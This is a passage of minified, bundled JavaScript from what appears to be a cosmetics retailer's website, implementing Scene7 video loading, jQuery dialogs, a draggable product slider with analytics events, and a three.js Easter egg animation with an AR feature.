window[n],r.parentElement.removeChild(r),t(e)}}};window.addEventListener("dm.image.init",(function(e){e.detail.element.classList.contains(r.STATIC_CLASS)?r.initializeStaticElement(e.detail.element):r.initializeElement(e.detail.element,!0)})),window.addEventListener("scroll",(function(){r.IS_LOADED||(r.IS_LOADED=!0,r.init(!1))})),window.addEventListener("DOMContentLoaded",(function(){r.init(!0)}))},{}],432:[function(e,t,n){var r={CLASS:"dm-responsive-video",INITIALIZED_CLASS:"dm-responsive-video-initialized",ASSET:"asset",DATA_ASSET:"data-asset",ID:"id",POSTER_IMAGE:"posterimage",DATA_POSTER_IMAGE:"data-posterimage",CONFIG:"config",DATA_CONFIG:"data-config",VIDEOVIEWER_URL:"https://rituals.scene7.com/s7viewers/html5/VideoViewer.html",VIDEO_FIRST_PART:"rituals/",DEFAULT_LINKS_CONFIG:{serverurl:"https://rituals.scene7.com/is/image/",contenturl:"https://rituals.scene7.com/is/content/",videoserverurl:"https://rituals.scene7.com/is/content",config:"rituals/Video"},DEFAULT_CONFIG:{loop:"1",autoplay:"1",mutevolume:"1",singleclick:"none",waiticon:"0",initialBitrate:"3000",playback:"progressive"},IS_LOADED:!1,INITIALIZED_ELEMENTS:{},init:function(e){Array.prototype.forEach.call(document.getElementsByClassName(r.CLASS),(function(t){!t.classList.contains(r.INITIALIZED_CLASS)&&(!e||e&&r.isElementInViewport(t))&&(t.classList.add(r.INITIALIZED_CLASS),r.initializeElement(t))}))},isElementInViewport:function(e){var t=e.getBoundingClientRect();return 0<=t.top&&0<=t.left&&t.top<=1.5*(window.innerHeight||document.documentElement.clientHeight)&&t.right<=(window.innerWidth||document.documentElement.clientWidth)},initializeElement:function(e,t){if(e){var n=r.getAssetConfig(e),i=_objectSpread(_objectSpread(_objectSpread({},r.DEFAULT_CONFIG),r.DEFAULT_LINKS_CONFIG),n);i[r.ASSET]=r.getAssetSource(e.dataset[r.ASSET],r.ASSET)||r.getAssetSource(n[r.ASSET],r.ASSET),i[r.POSTER_IMAGE]=r.getAssetSource(e.dataset[r.POSTER_IMAGE],r.POSTER_IMAGE)||r.getAssetSource(n[r.POSTER_IMAGE],r.POSTER_IMAGE)||r.getAssetSource(e.dataset[r.ASSET],r.POSTER_IMAGE)||r.getAssetSource(n[r.ASSET],r.POSTER_IMAGE)||i[r.ASSET],(/iP(ad|od|hone)/i.test(navigator.userAgent)||/Mac|Macintosh/i.test(navigator.userAgent))&&/WebKit/i.test(navigator.userAgent)&&!/(Chrome|CriOS|FxiOS|OPiOS|mercury|Firefox)/i.test(navigator.userAgent)&&(i.playback="progressive"),e.id||e.setAttribute(r.ID,r.CLASS+"-"+(new Date).getTime()),r.loadVideo(e,e.id,i,t)}},renitializeElement:function(e,t,n){if(e){if(e.removeAttribute(r.DATA_ASSET),e.removeAttribute(r.DATA_POSTER_IMAGE),e.removeAttribute(r.DATA_CONFIG),"object"===_typeof2(t)&&null!==t){var i=t[r.ASSET];delete t[r.ASSET];var a=t[r.POSTER_IMAGE];delete t[r.POSTER_IMAGE],e.setAttribute(r.DATA_CONFIG,JSON.stringify(t)),i&&e.setAttribute(r.DATA_ASSET,i),a&&e.setAttribute(r.DATA_POSTER_IMAGE,a)}r.initializeElement(e,n)}},loadVideo:function(e,t,n,i){var a=null;r.INITIALIZED_ELEMENTS[t]&&((a=r.INITIALIZED_ELEMENTS[t]).dispose(),delete r.INITIALIZED_ELEMENTS[t]),(a=new s7viewers.VideoViewer({containerId:t,params:n,handlers:{initComplete:function(){e.classList.add(r.INITIALIZED_CLASS),r.INITIALIZED_ELEMENTS[t]=a,i&&"[object Function]"==={}.toString.call(i)&&i()}}})).init()},getAssetSource:function(e,t){return e&&t?(-1<e.indexOf(r.VIDEOVIEWER_URL)&&(e=(e=e.replace(r.VIDEOVIEWER_URL,"")).replace("?",""),e=JSON.parse('{"'+e.replace(/&/g,'","').replace(/=/g,'":"')+'"}',(function(e,t){return""===e?t:decodeURIComponent(t)}))[t]),e?(-1<e.indexOf(r.DEFAULT_LINKS_CONFIG.contenturl)&&(e=e.replace(r.DEFAULT_LINKS_CONFIG.contenturl,"")),-1<e.indexOf(r.DEFAULT_LINKS_CONFIG.serverurl)&&(e=e.replace(r.DEFAULT_LINKS_CONFIG.serverurl,"")),0==e.indexOf(r.VIDEO_FIRST_PART)?e:null):null):null},getAssetConfig:function(e){try{return JSON.parse(e.dataset[r.CONFIG])}catch(e){return{}}}};window.addEventListener("dm.video.init",(function(e){r.renitializeElement(e.detail.element,e.detail.config,e.detail.onInitCallback)})),window.addEventListener("scroll",(function(){r.IS_LOADED||(r.IS_LOADED=!0,r.init(!1))})),window.addEventListener("DOMContentLoaded",(function(){r.init(!0)}))},{}],433:[function(e,t,n){var r=e("./modules/ajax"),i=e("./modules/util/appendParamToURL"),a=e("lodash/isString"),o=e("lodash/merge"),s=e("imagesloaded"),l={def:{$headerElement:$("header.header")},create:function(e){var t,n;0===(t=a(e.target)?"#"===e.target.charAt(0)?$(e.target):$("#"+e.target):e.target instanceof jQuery?e.target:$("#dialog-container")).length&&t.selector&&"#"===t.selector.charAt(0)&&(n=t.selector.substr(1),t=$("<div>").attr("id",n).addClass("dialog-content").appendTo("body")),this.$container=t,this.$container.dialog(o({},this.settings,e.options||{}))},open:function(e){this.create(e),this.replace(e)},openWithContent:function(e,t){var n,r=t||this.$container;if(r){var i=e.content||e.html;if(i){r.empty().html(i),r.dialog("isOpen")||r.dialog("open"),e.options&&(n=e.options.position),n||(n=this.settings.position),s(r).on("done",function(){r.dialog("option","position",n)}.bind(this)),("function"==typeof e.callback?e.callback:function(){})(),$(".js-bonus-product-dialog-wrapper").addClass("js-gwp-open"),0<$(".gwp-popup-padding").length&&($(".js-bonus-product-dialog-wrapper").addClass("no-padding"),$(".gwp-popup-padding").closest(".ui-dialog").addClass("no-padding"),$(".gwp-popup-padding").closest(".ui-dialog").css("width","650px"));var a=$(".js-close-popup-text").html();$(".ui-dialog-titlebar-close").attr("aria-label",a)}}},replace:function(e){this.$container&&(e.url?(e.url=i(e.url,"format","ajax"),r.load({url:e.url,data:e.data,dialogTarget:e.target,callback:function(t,n){e.content=t,this.openWithContent(e,n)}.bind(this)})):e.html?this.openWithContent(e):this.$container.dialog("open"))},close:function(){this.$container&&(this.$container.dialog("close"),$(".js-bonus-product-dialog-wrapper").removeClass("js-gwp-open"))},exists:function(){return this.$container&&0<this.$container.length},isActive:function(){return this.exists()&&0<this.$container.children.length},settings:{closeText:"",autoOpen:!1,height:"auto",draggable:!1,resizable:!1,modal:!1,overlay:{opacity:.5,background:"black"},title:"",width:"800",open:function(){if(!$(this).parent().hasClass("cookie-bar")){l.def.$headerElement.addClass("header--empty");var e=$(this);$("body").on("click",".ui-widget-overlay",(function(){e.dialog("close")}))}},close:function(){$(this).dialog("close"),$(".pt_privacy").length||$(".js-accept-cookies").length||l.def.$headerElement.removeClass("header--empty")},position:{my:"center",at:"center",of:window,collision:"flipfit"}}};$(document).on("click",".ui-dialog-titlebar-close, .js-close-bonus-popup",(function(){$(".js-bonus-product-dialog-wrapper").removeClass("js-gwp-open")})),$(document).on("keyup",(function(e){27==e.which&&$(".js-bonus-product-dialog-wrapper").hasClass("js-gwp-open")&&$(".js-bonus-product-dialog-wrapper").removeClass("js-gwp-open")})),t.exports=l},{"./modules/ajax":470,"./modules/util/appendParamToURL":496,imagesloaded:45,"lodash/isString":215,"lodash/merge":220}],434:[function(e,t,n){var r,i=e("./modules/google").tagManager,a=e("./modules/helpers/debounce"),o=e("./modules/helpers/prepareDeferedImages"),s=e("./responsive-background"),l=e("./modules/helpers/isMobileDevice"),c=e("./modules/helpers/isTouchDevice"),u=e("./dam/dam-helper"),d=e("./product-grid"),p=e("./advent"),h=[".drag-list-body .js-drag-list-item"],f=".js-drag-list",A=".js-drag-list-item",m="drag-list-item-active",v=".js-drag-list-prev",g=".js-drag-list-next",y="js-data-layer-list-pushed",b=!1,_=!1,w=0,C=[],x={rect:"",startX:0,clientX:0,target:""},S={horizontalPadding:l()?50:120,horizontalTileMargin:l()?10:20,maxTileWidthDesktop:424,itemsToShow:4.5,itemsToScroll:4,responsive:[{breakpoint:1300,settings:{itemsToShow:3.5,itemsToScroll:3}},{breakpoint:1100,settings:{itemsToShow:2.5,itemsToScroll:3}}]},k=function(e){var t=($(document).width()-S.horizontalPadding/2)/V(e,"itemsToShow");return Math.min(t,S.maxTileWidthDesktop)},M=function(e){var t=0;$(".drag-list-body",e).length&&$(".drag-list-body",e).contents().unwrap(),$(e).children().each((function(n,r){if(!l()&&!$(e).hasClass("js-slider-advent")){var i=k(e);$(r).width(i)}t+=$(r).width()})),t+=S.horizontalPadding,$(e).addClass("init").wrapInner('<div class="drag-list-body" style="min-width: '.concat(t,'px;"></div>'))},B=function(e){var t=0;$(".drag-list-body",e).children().each((function(n,r){if(!l()&&!$(e).hasClass("js-slider-advent")){var i=k(e);$(r).width(i)}t+=$(r).width()})),t+=S.horizontalPadding,$(".drag-list-body",e).css({"min-width":t+"px"})},E=function(e){var t=0;$(".js-product-tile-details-content",e).each((function(e,n){t=t>$(n).height()?t:$(n).height()})),$(".js-product-tile-details-content",e).height(t)},T=function(e,t,n,r){var i=t.getBoundingClientRect(),a=i.left,o=i.right,s=i.width;return $(t).removeClass(m),n<a&&a<r||n<o&&o<r?P(.2,100/s*(a<n?o-n:r-a)):null},P=function(e,t){var n=10*Math.round(Math.ceil(t)/10)/100;return n<e?e:1<n?1:n},I=function(e,t,n,r){1===T(0,t,n,r)&&p.pushAdventDataLayerDataWithActiveProductImageSlide("feature slider")},F=function(e){new IntersectionObserver((function(e){var t,n=_createForOfIteratorHelper(e);try{for(n.s();!(t=n.n()).done;){var r=t.value,i=$(r.target);!0!==r.isIntersecting||i.hasClass("lazyloaded")||(i.addClass("lazyloaded"),o(i))}}catch(e){n.e(e)}finally{n.f()}}),{threshold:[.05]}).observe(e)},L=function(e){var t=e.scrollLeft===e.scrollWidth-e.clientWidth,n=0===e.scrollLeft;$(e).closest(f).next().find(v).toggleClass("hidden",n),$(e).closest(f).next().find(g).toggleClass("hidden",t)},O=function(e){var t=$(e.currentTarget).data("listIndex"),n=$(C[t]);x.target=e.currentTarget,x.rect=x.target.getBoundingClientRect(),x.startX=n.scrollLeft()+e.clientX-x.rect.x,x.clientX=e.clientX,_=!0},N=function(){x.target="",x.rect="",x.startX=0,x.clientX=0,_=!1},D=function(e){if(_){var t=x.startX-(e.clientX-x.rect.x),n=x.clientX-e.clientX,r=$(x.target).data("listIndex"),i=$(C[r]);i.scrollLeft(t),b=2<n||n<-2,K(i[0],i[0].scrollLeft)}},R=function(e,t){var n=e.getBoundingClientRect().left,a=e.getBoundingClientRect().right;e.querySelectorAll(A).forEach((function(e,o){t&&$.isFunction(t)?t(o,e,n,a):function(e,t,n,a){var o=T(0,t,n,a);if(o){var s=-20*o;t.setAttribute("style","transform: translateY("+s+"px);"),1===o&&($(t).addClass(m),function(e,t){var n=$(t);if(e!==r&&!n.hasClass(y)){r=e;var a=$(".js-product-tile-datalayer-product",n),o=[];if(0<a.length){var s=JSON.parse(a.val());s&&(s.position=r+1,o.push(s))}n.addClass(y),0<o.length&&i.pushProducts(o)}}(e,t))}}(o,e,n,a)}))},j=function(e){if(b)return b=!1,e.preventDefault(),!1},U=function(e){var t=Q(e.data.listIndex),n=C[e.data.listIndex],r=$(n).find(A).width(),i=t<=V(n.el,"itemsToScroll"),a=t-V(n.el,"itemsToScroll"),o=i?0:r*a;$(n).animate({scrollLeft:o},500,"easeOutQuad"),K(n,o)},z=function(e){var t=Q(e.data.listIndex),n=C[e.data.listIndex],r=$(n).find(A).width(),i=n.scrollWidth-n.clientWidth,a=t+parseInt(V(n.el,"itemsToScroll")),o=i<=r*a?i:r*a;$(n).animate({scrollLeft:o},500,"easeOutQuad"),K(n,o)},H=function(){if(!c()){var e,t=_createForOfIteratorHelper(C);try{for(t.s();!(e=t.n()).done;){var n=e.value;if("isMobileOnly"!==n){var r=$(n.closest(f))[0];B(r),E(r)}}}catch(e){t.e(e)}finally{t.f()}}},V=function(e,t){var n,r=$(e).data("list-config"),i=S[t]||!1,a=_createForOfIteratorHelper(S.responsive);try{for(a.s();!(n=a.n()).done;){var o=n.value;o.breakpoint&&window.innerWidth<o.breakpoint&&(i=o.settings[t]||i)}}catch(e){a.e(e)}finally{a.f()}return void 0!==r&&r[t]?r[t]:i},Q=function(e){var t=$(C[e]),n=t.find(A).width(),r=t.scrollLeft();return 0<r?Math.ceil(r/n):r},G=function(e){return V(e,"isDesktopOnly")&&!l()||V(e,"isMobileOnly")&&l()||!V(e,"isDesktopOnly")&&!V(e,"isMobileOnly")},W=function(e){return V(e,"lazyLoad")&&"IntersectionObserver"in window&&"IntersectionObserverEntry"in window&&"intersectionRatio"in window.IntersectionObserverEntry.prototype};function K(e,t){var n,r,a=(n=100/(e.scrollWidth-e.clientWidth)*t,r=Math.round(10*n)/10,25*Math.floor(r/25));if(w!==a){w=a;var o=$(e).closest("section").data("sliderid");i.pushDataLayerEvent({event:"sliderScroll",sliderID:o,interaction:"horizontal_scroll",scroll_depth:a})}}var q={init:function(){0<$(f).length&&($(f).each((function(e,t){if($(t).hasClass("draglist-prepared"))return!1;if(u.updateImages(t),W(t)?F(t):o(t),!V(t,"hideArrows")&&G(t)||$(t).next().addClass("visually-hidden"),V(t,"hideBar")&&$(t).addClass("hidden-bar"),G(t)){if($(t).parents(".js-advent-overlay-inner").find(".js-advent-slider-image").length&&$(t).parents(".js-advent-overlay-inner").find(".js-advent-slider-image").each((function(){!function(e){var t=$(window).width(),n=e[0].naturalHeight,r=e[0].naturalWidth;n>.7*$(window).height()&&(r=(n=.7*$(window).height())*e[0].naturalWidth/e[0].naturalHeight);var i=Math.floor(r/$(window).width())||1;i%2==0&&(i-=1);for(var a=(r-i*t)/2,o=Math.round(a),s=i+(0<o?2:0),l=e.closest(".js-advent-overlay").find(".js-slider-advent"),c=0;c<s;c++)l.append($('<div class="advent-slide js-drag-list-item"></div>'));l.find(".js-drag-list-item").each((function(){$(this).is(":first-child")||$(this).is(":last-child")?$(this).css("width",o):$(this).css("width",t)}))}($(this))})),M(t),E(t),s.init(),$(t).hasClass("js-slider-advent")){var n=$(t).parents(".js-advent-overlay-inner").find(".js-advent-slider-image"),r=n[0].naturalHeight,i=$(t).find(".drag-list-body"),a=n.attr("src");i.css({height:r,"background-image":"url("+a+")"})}}else $(t).css({visibility:"visible"}),$(t).next().css({visibility:"visible"});$(t).addClass("draglist-prepared")})),$(f).each((function(e,t){var n=$(t);return!n.hasClass("draglist-initialized")&&(V(t,"isMobileOnly")?(C.push("isMobileOnly"),function(e){p.getAdventDataLayerDataWithActiveProductImageSlide()&&l()&&$(e).off("scroll").on("scroll",(function(){R(e,I)}))}(t),n.addClass("draglist-initialized"),!0):(C.push(t),n.data("listIndex",e),n.find("a, img").attr("draggable",!1),n.on("mousedown",O),n.on("scroll",a((function(e){L(e.currentTarget)}),100)),n.on("scroll",a((function(){d.pushProductsToDataLayer(h)}),100)),n.find(".js-linked-block").on("click.dragList",j),n.next().find(v).on("click",{listIndex:e},U),n.next().find(g).on("click",{listIndex:e},z),n.addClass("draglist-initialized"),void(l()&&"magnify"===V(t,"useEffect")&&(n.addClass("effect-magnify"),n.off("scroll").on("scroll",(function(){R(t)}))))))})),$(document).on("mouseup.dragList",N),$(document).on("mouseup.dragList",a((function(){d.pushProductsToDataLayer(h)}),100)),$(document).on("mousemove.dragList",D),$(window).on("resize.dragList",a((function(){H()}),200)))}};t.exports=q},{"./advent":286,"./dam/dam-helper":430,"./modules/google":474,"./modules/helpers/debounce":476,"./modules/helpers/isMobileDevice":484,"./modules/helpers/isTouchDevice":491,"./modules/helpers/prepareDeferedImages":492,"./product-grid":593,"./responsive-background":604}],435:[function(e,t,n){var r=e("../modules/google").tagManager,i=e("qrcode"),a=e("../modules/helpers/isTouchDevice"),o=e("../modules/util/getUpdatedURLWithParams"),s=function(e,t){var n=$(".js-the-ritual-of-title").first().text().trim();if(e){var i={event:"easter",event_category:t||"pdp",event_action:e,event_label:n};r.pushDataLayerEvent(i)}},l=function(e){e&&($(".js-easter-view-block-ar").remove(),$(".js-egg-model-viewer").remove()),$(".js-easter-view-block").removeClass("hide"),e&&c()},c=function(){$(document).on("click",".js-easter-link-whatsapp",(function(){s("whatsapp")})),$(document).on("click",".js-easter-link-messenger",(function(){s("messenger")})),$(document).off("click.easter",".js-easter-ar-button").on("click.easter",".js-easter-ar-button",(function(e){var t=$(e.target),n=t.data("popup-data");if(n){var r=$(".js-egg-model-viewer");a()&&r&&r.length&&r[0].canActivateAR||i.toDataURL(o({triggerARMode:!0,skipAnimation:!0},["skipAnimation"],!0),{width:180}).then((function(e){u.show(n,e,t)}))}}))},u={show:function(e,t,n){var r=$(n).closest(".js-easter-ar-block-wrapper");s(r&&r.length?"content view in 3D":"main view in 3d"),window.eventBus.$emit("shouldOpenModal",{resources:{heading:e.header,description:e.description},closeElement:{eventName:"onCloseElementClick",shouldCloseModal:!0},ctaHolder:{},easterModal:!0,icon:e.icon,QRcodeURL:t})}};t.exports={init:function(){c();var e=$(".js-egg-model-viewer");e&&e.length?e[0].canActivateAR?("true"==new URL(window.location.href).searchParams.get("triggerARMode")&&e[0].activateAR(),e.on("click",(function(e){var t=$(e.target).closest(".js-easter-ar-block-wrapper");s(t&&t.length?"content view in 3D":"main view in 3d")})),e.on("ar-status",(function(e){"failed"===e.detail.status&&l(!0)})),e.on("error",(function(){l(!0)}))):l(!0):l()},updateARbuttons:function(e,t,n){if(e&&t&&n){var r=$(".js-easter-ar-button");if(r&&r.length){var i=r.data("popup-data");i&&(i.src=e,i.iosSrc=t,i.description=n,r.attr("data-popup-data",JSON.stringify(i)))}}},updateARmodel:function(e,t){if(e&&t){var n=$(".js-egg-model-viewer");n&&n.length&&(n.attr("src",e),n.attr("ios-src",t))}},pushEvent:s,pushDataLayerDataForFAQBlock:function(e){$(".js-easter-pdp").length&&e&&s(e)}}},{"../modules/google":474,"../modules/helpers/isTouchDevice":491,"../modules/util/getUpdatedURLWithParams":512,qrcode:238}],436:[function(e,t,n){var r=e("three.interactive"),i=e("@tweenjs/tween.js"),a=e("three"),o=e("./modules/createLight"),s=e("./modules/animate"),l=e("./modules/createCamera"),c=e("./modules/createRenderer"),u=e("./modules/createScene"),d=e("./modules/eggs"),p=e("./modules/moveText"),h=e("./modules/splitText"),f=e("../modules/helpers/isSmallView"),A=e("../modules/helpers/isTabletView"),m=e("../modules/helpers/isDesktopView"),v=e("./modules/svgMorph"),g=e("../pages/product/updatePDPHandler"),y=e("./easter"),b=document.querySelector("#app"),_=document.querySelector("#world"),w=!1,C=function(e){"true"==new URL(window.location.href).searchParams.get("triggerARMode")&&f()&&S(e)},x=function(e){if("true"==new URL(window.location.href).searchParams.get("skipAnimation")||"true"==new URL(window.location.href).searchParams.get("triggerARMode")&&f())return document.querySelector(".overlay-to-pdp").style.opacity="1",document.querySelector(".overlay-to-pdp").style.display="block",S(e)},S=function(e){if(_.style.display="none",_.style.opacity="0",_.style.zIndex="-1",!e)return document.querySelector("body").classList.remove("no-scroll"),!0};function k(){return(k=_asyncToGenerator(regeneratorRuntime.mark((function e(){var t,n,S,k,B,E,T,P,I,F,L,O,N,D,R,j,U,z,H,V,Q,G,W,K,q,X,Y,J,Z,ee,te,ne,re,ie,ae,oe,se,le,ce,ue,de,pe,he,fe,Ae,me,ve,ge,ye,be,_e,we,Ce,xe,Se,ke,Me,Be,Ee,Te,Pe,Ie,Fe,Le,Oe,Ne;return regeneratorRuntime.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:if(Te=function(){w=!1,_.classList.remove("js-3d-visible"),document.querySelector("body").classList.remove("no-scroll"),$('.js-pdp-swatches-btn .js-pdp-swatches-image[data-variation-attribute-value="'+Q.variationAttributeValue+'"]').trigger("click.swatch"),g.updateStateAndUrlParams({skipAnimation:!0});var e=Q.model.animations[0],t=Q.model.scene,n=(q=new a.AnimationMixer(t)).clipAction(e);n.setLoop(a.LoopOnce),n.clampWhenFinished=!0,n.enabled=!0,n.time=0,n.play(),f()||(t.getObjectByName("RibbonBow").castShadow=!1,t.getObjectByName("RibbonBowTube").castShadow=!1);var r=t.getObjectByName("RibbonBow").material,o=t.getObjectByName("RibbonBowTube").material,s=t.getObjectByName("1105147-handmask-70ml_Tube002"),l=new i.Tween(r).to({opacity:0},300);new i.Tween(o).to({opacity:0},300).start(),new i.Tween(s.position).to({y:0},300).start();var c={opacity:0},u=new i.Tween(c).to({opacity:1},500).delay(1e3).onStart((function(){L.style.display="block",L.classList.add(Q.className)})).onUpdate((function(){L.style.opacity=c.opacity})),d=new i.Tween(c).to({opacity:0},500).onUpdate((function(){_.style.opacity=c.opacity})).onComplete((function(){_.style.zIndex=-1}));u.chain(d),l.chain(u),l.start();var p=this&&$(this).hasClass("js-open-egg")?M.BUTTON:M.IMAGE;y.pushEvent(p,"home")},Ee=function(){H.eggs.forEach((function(e){e.model.scene.getObjectByName("Egg_Top").position.y=.135,e.model.scene.getObjectByName("RibbonBow").material.transparent=!0,e.model.scene.getObjectByName("RibbonBow").material.depthWrite=!0,e.model.scene.getObjectByName("RibbonBowTube").material.depthWrite=!0,e.model.scene.getObjectByName("RibbonBowTube").material.opacity=1,e.model.scene.getObjectByName("HorizontalRibbonLeft").material.opacity=1,e.model.scene.getObjectByName("1105147-handmask-70ml_Tube002").position.y=-.01})),f()||(Q.model.scene.getObjectByName("RibbonBow").castShadow=!0,Q.model.scene.getObjectByName("RibbonBowTube").castShadow=!0),P.style.opacity=0,I.style.opacity=0,B.style.opacity=0},Be=function(){if(Me<ke){if(!Z)return!1;Z=!1,setTimeout(Se,2e3),xe()}if(ke<Me){if(!Z)return!1;Z=!1,setTimeout(Se,2e3),Ce()}return!0},Se=function(){Z=!0},xe=function(){var e=Q,t=G,n=W,r=new i.Tween(G.model.scene.position).to(me,2e3);r.easing(i.Easing.Quintic.InOut),r.start();var a=new i.Tween(Q.model.scene.position).to(ve,2e3);a.easing(i.Easing.Quintic.InOut),a.start();var o=new i.Tween(W.model.scene.position).to(ge,1e3).easing(i.Easing.Quintic.InOut),s=new i.Tween(W.model.scene.position).to(be,0).easing(i.Easing.Quintic.InOut),l=new i.Tween(W.model.scene.position).to(ye,600).easing(i.Easing.Quintic.InOut);s.chain(l),o.chain(s),o.start(),G=n,W=e;var c={skipAnimation:!0};c[(Q=t).variationAttribute]=Q.variationAttributeValue,g.updateStateAndUrlParams(c),we(P,I),ee(e)},Ce=function(){var e=Q,t=G,n=W,r=new i.Tween(G.model.scene.position).to(be,1e3).easing(i.Easing.Quintic.InOut),a=new i.Tween(G.model.scene.position).to(ge,0).easing(i.Easing.Quintic.InOut);r.chain(a);var o=new i.Tween(G.model.scene.position).to(ve,600).easing(i.Easing.Quintic.InOut);a.chain(o),r.start();var s=new i.Tween(Q.model.scene.position).to(ye,2e3);s.easing(i.Easing.Quintic.InOut),s.start();var l=new i.Tween(W.model.scene.position).to(me,2e3);l.easing(i.Easing.Quintic.InOut),l.start(),G=e,W=t;var c={skipAnimation:!0};c[(Q=n).variationAttribute]=Q.variationAttributeValue,g.updateStateAndUrlParams(c),we(P,I),ee(e)},we=function(e,t){var n={opacity:1},r={opacity:0,transform:20},a=new i.Tween(n).to({opacity:0},1e3).easing(i.Easing.Quadratic.Out).onUpdate((function(){e.style.opacity=n.opacity,t.style.opacity=n.opacity,B.style.opacity=n.opacity})).onComplete((function(){e.style.opacity=1,t.style.opacity=1,e.innerHTML=Q.text,B.style.opacity=1,B.style.transform="translateY(30px)",e.style.transform="translateY(30px)",t.style.transform="translateY(30px)",h(e),h(t)})),o=new i.Tween(r).to({opacity:1,transform:0},1e3).easing(i.Easing.Quadratic.Out).onUpdate((function(){B.style.transform="translateY("+r.transform+"px)",B.style.opacity=r.opacity,P.style.transform="translateY("+r.transform+"px)",P.style.opacity=r.opacity,I.style.transform="translateY("+r.transform+"px)",I.style.opacity=r.opacity}));a.chain(o),a.start()},_e=function(e,t){var n={opacity:0,transform:20},r=new i.Tween({opacity:1}).to({opacity:0},1e3).easing(i.Easing.Quadratic.Out).onComplete((function(){h(e),h(t)})),a=new i.Tween(n).to({opacity:1,transform:0},1e3).easing(i.Easing.Quadratic.Out).onUpdate((function(){B.style.transform="translateY("+n.transform+"px)",B.style.opacity=n.opacity,e.style.opacity=n.opacity,t.style.opacity=n.opacity,e.style.transform="translateY("+n.transform+"px)",t.style.transform="translateY("+n.transform+"px)"}));r.chain(a),r.start()},ee=function(e){b.className="",b.classList.add(Q.className);var t=e.className,n={opacity:0,opacityTwo:1};new i.Tween(n).to({opacity:1,opacityTwo:0},2e3).easing(i.Easing.Quadratic.Out).onUpdate((function(){document.getElementsByClassName("gradient-background "+Q.className)[0].style.opacity=n.opacity,document.getElementsByClassName("gradient-background "+t)[0].style.opacity=n.opacityTwo})).start()},X=function(e){w=!e,g.updateStateAndUrlParams({skipAnimation:!0});var t=f()?{x:5,y:1.2,z:3}:{x:9.2,y:1.2,z:6.8};k.position.set(t.x,t.y,t.z),k.rotation.set(-.158,1,.114);var n=f()?2:5.4;new i.Tween(k.position).to({x:0,y:.4,z:n},2e3).easing(i.Easing.Cubic.InOut).onStart((function(){b.classList.add("fadeInAnimation")})).onComplete((function(){b.classList.remove("fadeInAnimation"),window.setTimeout((function(){N.disabled=!1}),1e3)})).start(),new i.Tween(k.rotation).to({x:0,y:0,z:0},2e3).easing(i.Easing.Cubic.InOut).start(),window.setTimeout((function(){_e(P,I)}),500);var r={opacity:0};H.eggs.forEach((function(e){var t=e.model.scene.getObjectByName("Mesh_Reflection");t.material.opacity=0,new i.Tween(r).to({opacity:1},1e3).delay(900).onUpdate((function(){t.material.opacity=r.opacity})).start()}))},b&&_){e.next=12;break}return e.abrupt("return");case 12:return t=new a.Clock,n=c(b),S=u(),k=l(),B=document.querySelector(".js-open-egg"),E=document.querySelector(".js-btn-prev"),T=document.querySelector(".js-btn-next"),P=document.querySelector(".egg-text"),I=document.querySelector(".egg-header"),F=document.querySelector(".swipe-container"),L=document.querySelector(".overlay-to-pdp"),O=document.querySelector(".js-open-button"),N=document.querySelector(".js-breadcrumbs-easter"),D=f()||A()?b:F,R=document.querySelectorAll(".js-pdp-swatches-btn"),j=x(),N.disabled=!0,R.forEach((function(e){e.disabled=!0})),document.querySelector(".js-breadcrumbs-easter")&&(history.pushState(null,null,location.href),window.addEventListener("popstate",(function(){history.go(1),U()})),$(document).on("easter.startCloseAnimation",(function(){U()})),U=function(){if(!w){Ee(),C(!0),_.style.display="block",_.style.zIndex=10,L.className="",L.classList.add("overlay-to-pdp",Q.className);var e={opacity:0},t={opacity:1},n=new i.Tween(e).to({opacity:1},500).onUpdate((function(){_.style.opacity=e.opacity})),r=new i.Tween(t).to({opacity:0},1500).delay(200).onUpdate((function(){L.style.opacity=t.opacity})).onComplete((function(){L.style.display="none",L.classList.remove(Q.className)}));n.chain(r),n.start(),"none"==_.style.display?(document.querySelector("body").classList.remove("no-scroll"),document.querySelector(".world").classList.remove("js-3d-visible")):(document.querySelector("body").classList.add("no-scroll"),document.querySelector(".world").classList.add("js-3d-visible")),X()}}),v(),p(),z=new r.InteractionManager(n,k,n.domElement),e.next=36,d(b,_,j);case 36:H=e.sent,V=_toConsumableArray2(H.eggs),Q=V[0],G=V[1],W=V[2],K=function(){S.traverse((function(e){e instanceof a.Mesh&&e.material instanceof a.MeshStandardMaterial&&(e.getObjectByName("Mesh_Reflection")||f()||(e.receiveShadow=!0),e.material.envMap=H.props.environmentMap,e.material.envMapIntensity=2,e.material.needsUpdate=!0)}))},Y={x:0,y:0},J={width:window.innerWidth,height:window.innerHeight},window.addEventListener("resize",(function(){J.width=window.innerWidth,J.height=window.innerHeight,k.aspect=J.width/J.height,k.updateProjectionMatrix(),n.setPixelRatio(window.devicePixelRatio),n.setSize(J.width,J.height)})),window.addEventListener("mousemove",(function(e){Y.x=e.clientX/window.innerWidth-.5,Y.y=-(e.clientX/window.innerWidth-.5),Y.y<0&&(Y.y=e.clientX/window.innerWidth-.5)})),Z=!0,te={x:0,y:0,z:1.9},ne={x:0,y:0,z:1.2},re={x:0,y:0,z:.8},ie={x:-2.5,y:0,z:0},ae={x:-1.5,y:0,z:0},oe={x:-1.2,y:0,z:0},se={x:-3.5,y:0,z:0},le={x:-2.5,y:0,z:0},ce={x:-1.7,y:0,z:0},ue={x:2.5,y:0,z:0},de={x:1.5,y:0,z:0},pe={x:1.2,y:0,z:0},he={x:3.5,y:0,z:0},fe={x:2.5,y:0,z:0},Ae={x:1.7,y:0,z:0},me=f()?re:A()?ne:te,ve=f()?oe:A()?ae:ie,ge=f()?ce:A()?le:se,ye=f()?pe:A()?de:ue,be=f()?Ae:A()?fe:he,T.addEventListener("click",(function(){return!!Z&&(Z=!1,setTimeout(Se,2e3),xe(),!0)})),E.addEventListener("click",(function(){return!!Z&&(Z=!1,setTimeout(Se,2e3),Ce(),!0)})),Me=ke=0,D.addEventListener("touchstart",(function(e){ke=e.changedTouches[0].screenX})),D.addEventListener("touchend",(function(e){Me=e.changedTouches[0].screenX,50<=Math.abs(ke-Me)&&Be()})),O.addEventListener("click",(function(){Te()})),H.eggs.forEach((function(e,t){e.model.scene.getObjectByName("RibbonBow").material.opacity=1,e.model.scene.getObjectByName("RibbonBow").material.depthWrite=!0,e.model.scene.getObjectByName("RibbonBowTube").material.depthWrite=!0,e.model.scene.getObjectByName("Mesh_ContactShadowPlane").scale.set(1.1,1.1,1.1),f()||(e.model.scene.getObjectByName("RibbonBow").castShadow=!0,e.model.scene.getObjectByName("RibbonBowTube").castShadow=!0),e.model.scene.addEventListener("click",(function(){e.model.scene===